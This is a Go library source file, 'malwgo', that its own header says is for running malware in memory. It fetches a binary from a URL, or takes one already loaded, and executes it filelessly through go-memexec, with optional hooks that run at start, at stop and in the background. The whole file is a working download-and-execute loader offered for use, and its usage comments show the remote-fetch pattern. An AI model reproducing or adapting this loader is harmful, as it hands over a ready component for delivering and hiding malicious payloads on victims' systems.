// Description: A simple wrapper for go-memexec to run malwares in memory.
package malwgo

import (
	"io"
	"net/http"

	"github.com/amenzhinsky/go-memexec"
)

type Options struct {
	bin          []byte // binary loaded in memory
	onStart      func() // function to run before the command is executed
	onStop       func() // function to run after the command is executed
	onBackground func() // function to run in the background
	binUrl       string // url to download the binary
}

func (o *Options) getBinFromUrl() ([]byte, error) {

	resp, err := http.Get(o.binUrl)

	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

type Malwgo struct {
	opts    Options
	wrapper *memexec.Exec
}

// Exec executes the command with the given arguments. If handleErr is not nil, it will be called with the error if one occurs.
// Example:
//
// handleErr can be usefull to controll the error instead of using the default behavior of the function:
//
//	malwgo.Exec(func(output []byte{}, err error) {
//		fmt.Println(err)
//		fmt.Println(string(output))
//	}, "--help")
func (o Malwgo) Exec(handle func(output []byte, err error), args ...string) {

	if o.opts.onBackground != nil {
		go o.opts.onBackground()
	}

	go func() {

		if o.opts.onStart != nil {
			o.opts.onStart()
		}

		cmd := o.wrapper.Command(args...)

		output, err := cmd.Output()

		if err != nil {
			if handle != nil {
				handle([]byte{}, err)
				if o.opts.onStop != nil {
					o.opts.onStop()
				}
			} else if o.opts.onStop != nil {
				o.opts.onStop()
				return
			}
		}

		if handle != nil {
			handle(output, nil)
		}

		if o.opts.onStop != nil {
			o.opts.onStop()
		}

	}()

}

func (o *Malwgo) Close() {
	o.wrapper.Close()
}

// New creates a new Malwgo instance with the given options. Example usage:
//
// with a binary loaded in memory:
//
//	malgwo_inst, err := malwgo.New(&malwgo.Options{
//		bin: MyBinary,
//		onStart: func() {
//			fmt.Println("Starting...")
//		},
//		onStop: func() {
//			fmt.Println("Stopping...")
//		},
//		onBackground: func() {
//			fmt.Println("Running in background...")
//		},
//	})
//
// or with a binary url:
//
//	malgwo_inst, err := malwgo.New(&malwgo.Options{
//		binUrl: "https://example.com/mybinary",
//		onStart: func() {
//			fmt.Println("Starting...")
//		},
//		onStop: func() {
//			fmt.Println("Stopping...")
//		},
//		onBackground: func() {
//			fmt.Println("Running in background...")
//		},
//	})
func New(opts *Options) (*Malwgo, error) {

	if opts.bin == nil && opts.binUrl != "" {
		bin, err := opts.getBinFromUrl()

		if err != nil {
			return &Malwgo{}, err
		}

		opts.bin = bin
	}

	exec, err := memexec.New(opts.bin)

	if err != nil {
		return &Malwgo{}, err
	}

	return &Malwgo{*opts, exec}, nil
}
